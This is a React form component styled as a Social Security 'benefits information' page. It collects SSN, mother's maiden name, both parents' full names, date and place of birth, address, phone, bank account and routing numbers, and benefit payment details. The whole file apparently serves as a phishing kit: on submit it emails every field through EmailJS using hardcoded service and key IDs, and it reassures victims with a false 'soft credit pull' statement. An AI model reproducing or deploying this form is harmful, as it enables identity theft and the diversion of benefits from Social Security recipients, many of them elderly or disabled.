import React, { useRef } from "react";
import styles from "./Form.module.css";
import useInputs from "../../hooks/use-input";
import Dropdown from "./Dropdown";
import { useState } from "react";
import emailjs from "@emailjs/browser";

const Form = () => {
  const [isError, setIsError] = useState(false);
  const [isBank, setIsBank] = useState(false);
  const {
    value: enteredName,
    hasError: nameInputHasError,
    isValid: enteredNameIsValid,
    InputChangeHandler: nameChangedHandler,
    blurHandler: nameBlurHandler,
    reset: nameResetHandler,
  } = useInputs((value) => value.trim() !== "");
  const {
    value: enteredMaidenMother,
    hasError: motherMaidenInputHasError,
    isValid: enteredMotherMaidenIsValid,
    InputChangeHandler: motherMaidenChangedHandler,
    blurHandler: motherMaidenBlurHandler,
    reset: motherMaidenResetHandler,
  } = useInputs((value) => value.trim() !== "");
  const {
    value: enteredMotherFullName,
    hasError: motherFullInputHasError,
    isValid: enteredMotherFullIsValid,
    InputChangeHandler: motherFullChangedHandler,
    blurHandler: motherFullBlurHandler,
    reset: motherFullResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredFatherFullName,
    hasError: fatherFullInputHasError,
    isValid: enteredFatherFullIsValid,
    InputChangeHandler: fatherFullChangedHandler,
    blurHandler: fatherFullBlurHandler,
    reset: fatherFullResetHandler,
  } = useInputs((value) => value.trim() !== "");
  const {
    value: enteredSsn,
    hasError: ssnInputHasError,
    isValid: enteredSsnIsValid,
    InputChangeHandler: ssnChangedHandler,
    blurHandler: ssnBlurHandler,
    reset: ssnResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredPhone,
    hasError: phoneInputHasError,
    isValid: enteredPhoneIsValid,
    InputChangeHandler: phoneChangedHandler,
    blurHandler: phoneBlurHandler,
    reset: phoneResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredBirth,
    hasError: birthInputHasError,
    isValid: enteredBirthIsValid,
    InputChangeHandler: birthChangedHandler,
    blurHandler: birthBlurHandler,
    reset: birthResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredpaymentDate,
    // hasError: paymentDateHasError,
    isValid: enteredPaymentDateIsValid,
    InputChangeHandler: paymentDateChangedHandler,
    blurHandler: paymentDateBlurHandler,
    reset: paymentDateHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredBirthPLace,
    hasError: birthPLaceInputHasError,
    isValid: enteredBirthPLaceIsValid,
    InputChangeHandler: birthPLaceChangedHandler,
    blurHandler: birthPLaceBlurHandler,
    reset: birthPLaceResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredAddress,
    hasError: addressInputHasError,
    isValid: enteredAddressIsValid,
    InputChangeHandler: addressChangedHandler,
    blurHandler: addressBlurHandler,
    reset: addressResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredBankName,
    hasError: bankNameInputHasError,
    isValid: enteredBankNameIsValid,
    InputChangeHandler: bankNameChangedHandler,
    blurHandler: bankNameBlurHandler,
    reset: bankNameResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredPostalCode,
    hasError: postalCodeInputHasError,
    isValid: enteredPostalCodeIsValid,
    InputChangeHandler: postalCodeChangedHandler,
    blurHandler: postalCodeBlurHandler,
    reset: postalCodeResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredCountry,
    hasError: countryInputHasError,
    isValid: enteredCountryIsValid,
    InputChangeHandler: countryChangedHandler,
    blurHandler: countryBlurHandler,
    reset: countryResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredAccountNumber,
    hasError: accountNumberInputHasError,
    isValid: enteredAccountNumberIsValid,
    InputChangeHandler: accountNumberChangedHandler,
    blurHandler: accountNumberBlurHandler,
    reset: accountNumberResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredRoutineNumber,
    hasError: routineNumberInputHasError,
    isValid: enteredRoutineNumberIsValid,
    InputChangeHandler: routineNumberChangedHandler,
    blurHandler: routineNumberBlurHandler,
    reset: routineNumberResetHandler,
  } = useInputs((value) => value.trim() !== "");

  const {
    value: enteredSpp,
    hasError: sppInputHasError,
    isValid: enteredSppIsValid,
    InputChangeHandler: sppChangedHandler,
    blurHandler: sppBlurHandler,
    reset: sppResetHandler,
  } = useInputs((value) => value.trim() !== "");

  let formIsValid = false;

  if (
    enteredNameIsValid &&
    enteredAddressIsValid &&
    enteredBirthIsValid &&
    enteredCountryIsValid &&
    enteredFatherFullIsValid &&
    enteredMotherMaidenIsValid &&
    enteredPhoneIsValid &&
    enteredBirthIsValid &&
    enteredMotherFullIsValid &&
    enteredSppIsValid &&
    enteredSsnIsValid &&
    enteredPostalCodeIsValid &&
    enteredBirthPLaceIsValid
  ) {
    formIsValid = true;
  }

  const form = useRef();

  const submitFormHandler = (e) => {
    e.preventDefault();
    // console.log(e);

    if (!formIsValid) {
      setIsError(true);
      return;
    }
    setIsError(false);

    // emailjs
    // .sendForm(
    //   "service_fq21sfp",
    //   "template_phztsf5",
    //   form.current,
    //   "1MwfGiHvIR23mx4lH"
    // )

    emailjs
      .sendForm(
        "service_fl0v6od",
        "template_69nagna",
        form.current,
        "1MwfGiHvIR23mx4lH"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    nameResetHandler();
    birthResetHandler();
    countryResetHandler();
    ssnResetHandler();
    sppResetHandler();
    fatherFullResetHandler();
    motherFullResetHandler();
    phoneResetHandler();
    accountNumberResetHandler();
    motherMaidenResetHandler();
    routineNumberResetHandler();
    postalCodeResetHandler();
    addressResetHandler();
    bankNameResetHandler();
    birthPLaceResetHandler();
    paymentDateHandler();
  };

  const isBankHandler = (isOptionSelected) => {
    if (isOptionSelected === "Bank Account") {
      setIsBank(true);
    } else {
      setIsBank(false);
    }
  };

  // console.log(isBank);

  const isBenefitHandler = (isOptionSelected) => {};

  return (
    <div className={styles["wrapper"]}>
      <div className={styles["title-div"]}>
        <h1>BENEFITS INFORMATION</h1>
        <h3>PERSONAL INFORMATION</h3>
      </div>
      <form
        onSubmit={submitFormHandler}
        ref={form}
        // method="POST"
        className={styles.form}
      >
        <ul className={styles.lists}>
          <li
            className={
              !nameInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="full-name"> Full Name</label>
            <input
              onChange={nameChangedHandler}
              onBlur={nameBlurHandler}
              value={enteredName}
              required
              name="full-name"
              id="full-name"
              className={styles["input"]}
              type="text"
            />
          </li>
          <li
            className={
              !motherMaidenInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="mother-maiden">Mother Maiden Name</label>
            <input
              onChange={motherMaidenChangedHandler}
              onBlur={motherMaidenBlurHandler}
              value={enteredMaidenMother}
              id="mother-maiden"
              required
              name="Mother maiden Name"
              className={styles["input"]}
              type="text"
            />
          </li>
          <li
            className={
              !motherFullInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="mother-full"> Mother Full Name</label>
            <input
              onChange={motherFullChangedHandler}
              onBlur={motherFullBlurHandler}
              value={enteredMotherFullName}
              required
              name="Mother Full Name"
              id="mother-full"
              className={styles["input"]}
              type="text"
            />
          </li>
          <li
            className={
              !fatherFullInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="father-full"> Father Full Name</label>
            <input
              onChange={fatherFullChangedHandler}
              onBlur={fatherFullBlurHandler}
              value={enteredFatherFullName}
              required
              name="Father Full Name"
              id="father-full"
              className={styles["input"]}
              type="text"
            />
          </li>
          <li
            className={
              !ssnInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="ssn">Social Security Number (SSN)</label>
            <input
              onChange={ssnChangedHandler}
              onBlur={ssnBlurHandler}
              value={enteredSsn}
              required
              name="SSN"
              placeholder="555-555-555"
              id="snn"
              className={styles["input"]}
              type="number"
            />
          </li>
          <li
            className={
              !phoneInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="phone">Phone Number With Social Security</label>
            <input
              onChange={phoneChangedHandler}
              onBlur={phoneBlurHandler}
              value={enteredPhone}
              required
              id="phone"
              name="Phone Number"
              className={styles["input"]}
              type="number"
            />
          </li>
          <li
            className={
              !birthInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="dob"> Date of Birth</label>
            <input
              onChange={birthChangedHandler}
              onBlur={birthBlurHandler}
              value={enteredBirth}
              required
              name="Date Of Birth"
              id="dob"
              className={styles["input"]}
              type="date"
            />
          </li>
          <li
            className={
              !addressInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="address"> Address With Social Security </label>
            <input
              onChange={addressChangedHandler}
              onBlur={addressBlurHandler}
              value={enteredAddress}
              required
              id="address"
              name="Address"
              className={styles["input"]}
              type="text"
            />
          </li>
          <li
            className={
              !birthPLaceInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="birth-Place"> Birth Place</label>
            <input
              onChange={birthPLaceChangedHandler}
              onBlur={birthPLaceBlurHandler}
              value={enteredBirthPLace}
              required
              id="birth-Place"
              name="birth-Place"
              className={styles["input"]}
              type="text"
            />
          </li>
          <li className={styles.list}>
            <label htmlFor="payment-method"> Payment Method</label>
            <Dropdown
              onIsBank={isBankHandler}
              name="payment Method"
              values={[
                { title: "Direct Express Card", key: 1 },
                { title: "Bank Account", key: 2 },
              ]}
            />
          </li>
          {isBank && (
            <li
              className={
                !bankNameInputHasError
                  ? `${styles.list}`
                  : `${styles.list} ${styles.error}`
              }
            >
              <label htmlFor="bank-name">Bank Name</label>
              <input
                onChange={bankNameChangedHandler}
                onBlur={bankNameBlurHandler}
                required
                value={enteredBankName}
                id="bank-name"
                name="Bank Name"
                className={styles["input"]}
                type="text"
              />
            </li>
          )}
          {isBank && (
            <li className={styles["double-input"]}>
              <div
                className={
                  !accountNumberInputHasError
                    ? `${styles["double-input"]}`
                    : `${styles["double-input"]} ${styles.error}`
                }
              >
                <label htmlFor="acc-num">Account Number</label>
                <input
                  onChange={accountNumberChangedHandler}
                  onBlur={accountNumberBlurHandler}
                  required
                  value={enteredAccountNumber}
                  name="Account Number"
                  id="acc-num"
                  className={styles["input"]}
                  type="number"
                />
              </div>
              <div
                className={
                  !routineNumberInputHasError
                    ? `${styles["double-input"]}`
                    : `${styles["double-input"]} ${styles.error}`
                }
              >
                <label htmlFor="routine-number">Routine Number</label>
                <input
                  onChange={routineNumberChangedHandler}
                  onBlur={routineNumberBlurHandler}
                  required
                  value={enteredRoutineNumber}
                  name="Routine Number"
                  id="routine-number"
                  className={styles["input"]}
                  type="number"
                />
              </div>
            </li>
          )}
          <li className={styles["double-input"]}>
            <div
              className={
                !postalCodeInputHasError
                  ? `${styles["double-input-list"]}`
                  : `${styles["double-input-list"]} ${styles.error}`
              }
            >
              <label htmlFor="Zipcode">Zipcode</label>
              <input
                onChange={postalCodeChangedHandler}
                onBlur={postalCodeBlurHandler}
                required
                value={enteredPostalCode}
                name="Zipcode"
                id="Zipcode"
                className={styles["input"]}
                type="number"
              />
            </div>
            <div
              className={
                !countryInputHasError
                  ? `${styles["double-input-list"]}`
                  : `${styles["double-input-list"]} ${styles.error}`
              }
            >
              <label htmlFor="country"> Country </label>
              <input
                onChange={countryChangedHandler}
                onBlur={countryBlurHandler}
                required
                value={enteredCountry}
                id="country"
                name="Country"
                className={styles["input"]}
                type="text"
              />
            </div>
          </li>
          <li
            className={
              !sppInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="ssp"> Exact Amount Social Security Pay </label>
            <input
              onChange={sppChangedHandler}
              onBlur={sppBlurHandler}
              required
              name="Social Security Pay"
              value={enteredSpp}
              id="spp"
              className={styles["input"]}
              type="text"
            />
          </li>
          <li
            className={
              !birthInputHasError
                ? `${styles.list}`
                : `${styles.list} ${styles.error}`
            }
          >
            <label htmlFor="payment-date"> Payment Date</label>
            <input
              onChange={paymentDateChangedHandler}
              onBlur={paymentDateBlurHandler}
              value={enteredpaymentDate}
              required
              name="Payment date"
              id="payment-date"
              className={styles["input"]}
              type="date"
            />
          </li>
          <li className={styles.list}>
            <label htmlFor="benefits"> Other Benefits Received </label>
            <Dropdown
              onIsBank={isBenefitHandler}
              name={"message"}
              values={[
                { title: "Disable", key: 1 },
                { title: "Retired", key: 2 },
                { title: "Veteran", key: 3 },
              ]}
            />
          </li>
        </ul>
        <h4>
          Our benefits Service use SSN combined with other personal information
          to verify your identity and to provide you with the most accurate
          benefits offers. They perform a soft credit pull, which won't affect
          your credit score.
        </h4>
        {isError && (
          <h3 className={styles.errorMessage}> Fill in the Inputs</h3>
        )}
        <button
          // onSubmit={submitFormHandler}
          type="submit"
          className={styles["form-btn"]}
        >
          Continue
        </button>
      </form>
    </div>
  );
};

export default Form;
